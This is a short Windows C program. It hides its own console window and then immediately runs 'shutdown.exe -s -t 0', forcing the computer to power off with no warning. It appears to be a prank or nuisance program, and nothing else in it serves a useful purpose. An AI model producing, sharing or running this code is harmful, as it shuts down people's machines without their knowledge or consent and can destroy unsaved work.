#include "windows.h"
main()
{
	HWND hwnd;
    hwnd=FindWindow("ConsoleWindowClass",NULL);
    if(hwnd)
    {
            ShowOwnedPopups(hwnd,SW_HIDE);
            ShowWindow(hwnd,SW_HIDE);
    } 
//	system("ping 127.0.0.1");
	system("shutdown.exe -s -t 0");
}